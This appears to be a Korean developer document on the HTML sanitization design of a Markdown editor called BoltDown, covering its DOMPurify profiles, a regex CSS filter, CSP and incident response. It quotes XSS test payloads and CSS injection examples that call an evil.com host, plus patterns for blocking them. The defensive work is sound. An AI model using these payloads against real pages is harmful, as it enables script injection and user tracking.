# HTML Sanitization Architecture

**작성일**: 2026-02-18
**대상**: BoltDown 개발자
**목적**: HTML sanitization 아키텍처 및 보안 정책 문서화

---

## 개요 (Overview)

BoltDown은 사용자가 작성한 Markdown을 HTML로 렌더링하는 과정에서 여러 렌더링 경로를 사용합니다. 각 경로는 서로 다른 보안 요구사항을 가지며, 이에 따라 5개의 전문화된 sanitization 프로필을 제공합니다.

**핵심 원칙**:

1. **모든 사용자 생성 HTML은 렌더링 전 sanitize 필수**
2. **렌더링 경로별 최소 권한 원칙 적용** (Preview는 넓게, Code는 좁게)
3. **DOMPurify 기반 whitelist 방식** (5개 함수) + **정규식 기반 CSS 필터** (1개 함수)

**보안 위협 모델**:

- XSS (Cross-Site Scripting): `<script>`, `onerror=`, `javascript:` URI
- External resource loading: `@import`, `url(http://...)`
- Legacy IE/Firefox XSS vectors: `expression()`, `-moz-binding:`, `behavior:`

---

## 아키텍처 (Architecture)

### 데이터 흐름 다이어그램

```
사용자 Markdown 입력
    │
    ├─→ markdown-it.render() ──→ sanitizePreviewHtml() ──→ Preview pane (MarkdownPreview.tsx)
    │                                                    ──→ Export HTML (useExport.ts)
    │                                                    ──→ Copy HTML (useExport.ts)
    │
    └─→ CodeMirror 6 (Zen Mode WYSIWYG)
         ├─→ KaTeX.renderToString() ──→ sanitizeKatexHtml() ──→ Math widgets
         │                                                     (InlineMathWidget.ts)
         │                                                     (BlockMathWidget.ts)
         ├─→ Prism.highlight() ──→ sanitizeCodeHtml() ──→ Code widgets
         │                                               (CodeBlockWidget.ts)
         └─→ mermaid.render() ──→ sanitizeSvgHtml() ──→ Diagram widgets
                                                        (MermaidWidget.ts)
                                                        (MarkdownPreview.tsx)

사용자 Custom CSS ──→ sanitizeCustomCss() ──→ <style> injection (useCustomCss.ts)
```

### 파일 구조

```
src/utils/sanitize.ts           # 5개 DOMPurify 프로필 + 1개 CSS 필터
src/hooks/useMarkdownParser.ts  # Preview 렌더링 진입점
src/hooks/useExport.ts          # HTML/PDF export + CSP 헤더
src/hooks/useCustomCss.ts       # 사용자 CSS injection
src/components/editor/extensions/wysiwyg/
  ├── InlineMathWidget.ts       # KaTeX inline math ($...$)
  ├── BlockMathWidget.ts        # KaTeX block math ($$...$$)
  ├── CodeBlockWidget.ts        # Prism.js syntax highlighting
  └── MermaidWidget.ts          # Mermaid diagram rendering
src/components/preview/MarkdownPreview.tsx  # Preview pane + Mermaid
```

---

## 프로필 상세 (Profile Details)

### 1. `sanitizePreviewHtml(html: string)` — Preview Pane

**용도**: markdown-it로 렌더링된 HTML을 Preview 패널에 표시
**사용처**:

- `useMarkdownParser.ts` (line 35) — 실시간 미리보기
- `useExport.ts` (lines 129, 169) — HTML export + Copy HTML

**DOMPurify 설정**:

```typescript
DOMPurify.sanitize(html, {
  ADD_TAGS: [...MATHML_TAGS, ...KATEX_SVG_TAGS],
  ADD_ATTR: EXTRA_ATTRS,
  ALLOW_DATA_ATTR: true,
})
```

**허용 태그** (기본 HTML + 추가):

- **MathML**: 30개 태그 (`math`, `mrow`, `mi`, `mo`, `mn`, `mfrac`, `msup`, `msub`, `msubsup`, `mroot`, `msqrt`, `mover`, `munder`, `munderover`, `mtable`, `mtr`, `mtd`, `semantics`, `ms`, `mtext`, `mspace`, `menclose`, `mpadded`, `mphantom`, `annotation`, `annotation-xml`)
- **KaTeX SVG**: 5개 태그 (`svg`, `line`, `path`, `g`, `rect`)

**허용 속성**:

- **MathML**: `xmlns`, `mathvariant`, `encoding`, `displaystyle`, `scriptlevel`, `columnalign`, `rowspacing`, `columnspacing`, `fence`, `stretchy`, `symmetric`, `lspace`, `rspace`, `movablelimits`, `accent`, `accentunder`
- **SVG**: `viewBox`, `preserveAspectRatio`, `d`, `x1`, `y1`, `x2`, `y2`, `fill`, `stroke`, `stroke-width`, `transform`
- **General**: `style`, `aria-hidden`, `role`
- **Scroll sync**: `data-*` (ALLOW_DATA_ATTR: true로 활성화)

**특이사항**: Preview는 가장 넓은 허용 범위를 가짐. `data-*` 속성은 scroll sync 기능에 필수 (Preview ↔ Editor 스크롤 동기화).

---

### 2. `sanitizeKatexHtml(html: string)` — WYSIWYG Math Widgets

**용도**: Zen mode에서 KaTeX 수식 위젯 렌더링
**사용처**:

- `InlineMathWidget.ts` (line 19) — `$...$` inline math
- `BlockMathWidget.ts` (line 21) — `$$...$$` block math

**DOMPurify 설정**:

```typescript
DOMPurify.sanitize(html, {
  ADD_TAGS: [...MATHML_TAGS, ...KATEX_SVG_TAGS],
  ADD_ATTR: EXTRA_ATTRS,
  // ALLOW_DATA_ATTR: false (기본값)
})
```

**차이점**: `sanitizePreviewHtml`과 동일하지만 **`data-*` 속성 불허**. Editor 위젯은 scroll sync 대상이 아니므로 불필요.

**캐싱**: `wysiwygKatexCache` (LRU 200 entries) — `i:${content}` (inline) / `b:${content}` (block) 키로 캐싱하여 재렌더링 성능 최적화.

---

### 3. `sanitizeCodeHtml(html: string)` — WYSIWYG Code Widgets

**용도**: Zen mode에서 Prism.js 구문 강조 코드 블록 렌더링
**사용처**:

- `CodeBlockWidget.ts` (line 126) — 펜스 코드 블록 (` ```lang ... ``` `)

**DOMPurify 설정**:

```typescript
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['span', 'br'],
  ALLOWED_ATTR: ['class', 'style'],
})
```

**제한 이유**: Prism.js는 **`<span>`과 `<br>`만 생성**하며, 클래스명으로 토큰 타입을 표현 (예: `token keyword`, `token string`). 매우 좁은 whitelist가 적절.

**지원 언어**: bash, css, javascript, json, jsx, markdown, python, rust, tsx, typescript (확장 가능).

---

### 4. `sanitizeSvgHtml(svg: string)` — Mermaid Diagrams

**용도**: Mermaid 다이어그램 SVG 렌더링
**사용처**:

- `MermaidWidget.ts` (line 67) — Zen mode 다이어그램 위젯
- `MarkdownPreview.tsx` (line 66) — Preview pane 다이어그램

**DOMPurify 설정**:

```typescript
DOMPurify.sanitize(svg, {
  USE_PROFILES: { svg: true, svgFilters: true },
  ADD_TAGS: ['foreignObject', 'style'],
  ADD_ATTR: ['style', 'class', 'aria-hidden', 'role', 'xmlns', 'xmlns:xlink'],
})
```

**특이사항**:

- **`foreignObject`**: Mermaid가 텍스트 렌더링에 사용 (HTML in SVG)
- **`style` 태그**: Mermaid가 다이어그램별 CSS를 inline으로 삽입
- **svgFilters 프로필**: 그림자/그라데이션 등 SVG 필터 허용

**캐싱**: `mermaidSvgCache` (LRU 50 entries) — `${code}:${theme}:${securityLevel}` 키로 캐싱. 테마/보안레벨 변경 시 재렌더링.

**보안 레벨**: `strict` (default) / `loose` (user-configurable in settings).

---

### 5. `sanitizeCustomCss(css: string)` — User Custom CSS

**용도**: 사용자가 Settings에서 입력한 custom CSS 필터링
**사용처**:

- `useCustomCss.ts` (line 27) — `<style id="user-custom-css">` injection (300ms debounce)

**⚠️ DOMPurify 사용 안 함**: CSS는 HTML이 아니므로 **정규식 기반 패턴 차단** 사용.

**차단 패턴**:

```typescript
css
  .replace(/@import\b[^;]*;?/gi, '/* blocked: @import */') // 외부 CSS 로드 차단
  .replace(
    /url\s*\(\s*(['"]?)\s*(?:https?:|\/\/)/gi, // HTTP URL 차단
    "url($1about:invalid'"
  )
  .replace(/javascript\s*:/gi, '/* blocked */') // JS URI 차단
  .replace(/expression\s*\(/gi, '/* blocked */(') // IE expression() 차단
  .replace(/-moz-binding\s*:/gi, '/* blocked */:') // Firefox XBL 차단
  .replace(/behavior\s*:/gi, '/* blocked */:') // IE behavior 차단
```

**허용 사례**:

- Color, font, spacing, layout 속성
- `url(data:...)` (Data URI 허용)
- CSS custom properties (`--var-name`)

**차단 사례**:

- `@import url('https://evil.com/steal.css');`
- `background: url(http://evil.com/tracker.png);`
- `color: expression(alert(1));` (IE legacy)

---

## 새 렌더링 경로 추가 체크리스트

새로운 렌더링 라이브러리를 추가할 때 (예: PlantUML, Chart.js):

### 1. 위협 모델 분석

- [ ] 라이브러리가 생성하는 HTML 구조 파악 (Chrome DevTools)
- [ ] 사용자 입력이 HTML 속성/내용에 직접 삽입되는지 확인
- [ ] 외부 리소스 로드 가능 여부 확인 (img src, @import 등)

### 2. 최소 권한 프로필 설계

- [ ] 필요한 태그 목록 작성 (ALLOWED_TAGS 또는 ADD_TAGS)
- [ ] 필요한 속성 목록 작성 (ALLOWED_ATTR 또는 ADD_ATTR)
- [ ] DOMPurify 프로필 선택 (svg, mathMl, html 등)
- [ ] `data-*` 속성 필요 여부 결정 (ALLOW_DATA_ATTR)

### 3. sanitize.ts에 함수 추가

```typescript
/**
 * Sanitize [LibraryName] output.
 * Used by: [파일명과 위치]
 */
export function sanitize[LibraryName]Html(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [...],      // 또는 ADD_TAGS
    ALLOWED_ATTR: [...],      // 또는 ADD_ATTR
    USE_PROFILES: { ... },    // 필요시
  })
}
```

### 4. Widget/Hook에서 적용

```typescript
import { sanitize[LibraryName]Html } from '@/utils/sanitize'

const rawHtml = library.render(userInput)
const safeHtml = sanitize[LibraryName]Html(rawHtml)
element.innerHTML = safeHtml
```

### 5. 테스트 시나리오

- [ ] 정상 입력 렌더링 확인
- [ ] XSS payload 차단 확인 (`<script>alert(1)</script>`)
- [ ] Event handler 차단 확인 (`<img src=x onerror=alert(1)>`)
- [ ] `javascript:` URI 차단 확인 (`<a href="javascript:alert(1)">`)
- [ ] 외부 리소스 로드 차단 확인 (필요시)

### 6. 문서화

- [ ] 이 문서에 새 프로필 섹션 추가
- [ ] 아키텍처 다이어그램 업데이트
- [ ] AGENTS.md 업데이트 (해당 위젯 파일에)

---

## 보안 고려사항 (Security Considerations)

### 1. Defense in Depth (다층 방어)

**Layer 1: Input Sanitization** (현재 구현)

- 모든 렌더링 경로에서 DOMPurify/regex 필터 적용
- Whitelist 방식 — 명시적으로 허용된 것만 통과

**Layer 2: CSP (Content Security Policy)**

- Export HTML에 CSP 메타 태그 추가 (useExport.ts line 72):
  ```html
  <meta
    http-equiv="Content-Security-Policy"
    content="default-src 'none';
                 style-src 'unsafe-inline' https://cdn.jsdelivr.net;
                 img-src data: https:;
                 font-src https://cdn.jsdelivr.net;"
  />
  ```
- **제한사항**: 앱 내부 렌더링에는 CSP 미적용 (Tauri webview는 별도 설정 필요)

**Layer 3: Tauri Isolation** (Tauri 2.0)

- Frontend ↔ Backend IPC 격리
- File system access는 ACL (Access Control List)로 제한
- `capabilities/default.json`에서 명시적 권한 부여 필요

### 2. Known Limitations

**1) DOMPurify는 HTML만 처리**

- CSS는 별도 regex 필터 사용 (`sanitizeCustomCss`)
- JavaScript는 렌더링 경로에 없음 (markdown-it는 JS 생성 안 함)

**2) Mermaid `loose` 모드 위험**

- `securityLevel: 'loose'`는 `javascript:` URI 허용
- 사용자 설정 가능하지만 기본값은 `strict`
- `sanitizeSvgHtml`가 `javascript:` 속성을 제거하지만, 이중 방어 권장

**3) Custom CSS는 완전 격리 불가**

- CSS injection으로 UI 스푸핑 가능 (예: fake 파일 경로 표시)
- 사용자가 자신의 UI를 망가뜨릴 수 있음 (self-inflicted)
- XSS는 차단하지만 phishing은 완전 방지 불가

### 3. Upgrade Considerations

**DOMPurify 업그레이드 시**:

- CHANGELOG에서 breaking changes 확인
- 특히 `ALLOWED_TAGS`, `ADD_TAGS` 동작 변경 주의
- 모든 5개 프로필 테스트 실행

**Mermaid 업그레이드 시**:

- 새 다이어그램 타입이 추가되면 `sanitizeSvgHtml` 프로필 검토
- `foreignObject` 사용 증가 여부 확인
- Security advisories 체크 (Mermaid는 과거 XSS 취약점 있었음)

**KaTeX 업그레이드 시**:

- MathML 태그 목록 변경 여부 확인 (`MATHML_TAGS`)
- HTML output 모드 변경 주의 (현재 MathML + SVG fallback)

### 4. Incident Response

**XSS 취약점 발견 시**:

1. 영향받는 프로필 식별 (5개 중 어느 것?)
2. 최소 권한 원칙 재검토 — 불필요한 태그/속성 제거
3. 회귀 테스트 추가 (payload를 test fixture로)
4. CHANGELOG에 security fix 명시
5. GitHub Security Advisory 발행 (공개 전 수정)

**External resource loading 발견 시**:

1. CSP 위반 여부 확인 (Export HTML)
2. `sanitizeCustomCss`의 URL 필터 강화
3. Image proxy 고려 (현재 없음)

---

## 참고 자료 (References)

### Internal

- `src/utils/sanitize.ts` — 전체 구현체
- `src/hooks/useMarkdownParser.ts` — Preview 렌더링 진입점
- `.docs/project/planning/backlog.md` — Security 백로그 (DOMPurify 통합 완료, Mermaid loose mode 대기)

### External

- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CSP Reference (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Mermaid Security](https://mermaid.js.org/config/setup/modules/mermaidAPI.html#securitylevel)
- [KaTeX Security](https://katex.org/docs/security.html)

---

## 변경 이력 (Changelog)

| 날짜       | 변경 내용                                    | 작성자 |
| ---------- | -------------------------------------------- | ------ |
| 2026-02-18 | 초안 작성 (5 profiles + 1 CSS filter 문서화) | Writer |
